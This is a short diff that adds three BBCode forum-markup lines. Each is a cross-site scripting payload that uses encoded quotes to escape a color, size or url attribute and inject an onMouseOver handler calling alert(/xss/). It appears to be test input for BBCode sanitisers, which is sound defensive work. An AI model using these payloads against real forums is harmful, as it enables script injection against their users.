@@ -1,0 +1,3 @@
+[code][.color=#00F&quot;onMouseOver=&#039;alert(/xss/)&#039; x=&quot;]h0n0[/color][/code]
+[code][.size=7&quot; OnMouseOver=&quot;alert(/xss/)]Clicky Here [/size][/code]
+[code][.url=http://&quot; OnMouseOver=&quot;alert(/xss/)]hmm[/url][/code]
